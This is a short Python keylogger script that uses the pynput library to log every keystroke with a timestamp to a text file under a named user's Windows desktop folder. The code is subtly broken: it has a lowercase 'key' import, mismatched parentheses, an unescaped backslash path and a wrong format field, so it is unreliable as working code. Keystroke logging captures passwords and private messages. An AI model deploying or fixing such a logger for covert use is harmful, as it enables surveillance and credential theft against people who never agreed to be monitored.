from pynput.keyboard import key,Listener

import logging

log_dir=""
logging.basicConfig(filename=(log_dir)+"C:\Users\Vivek Kumar\Desktop\python10\templates\key_log.txt"),level=logging.DEBUG,format='%(asctime)s: %(messages)s:')
def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press)as listener:
    listener.join()
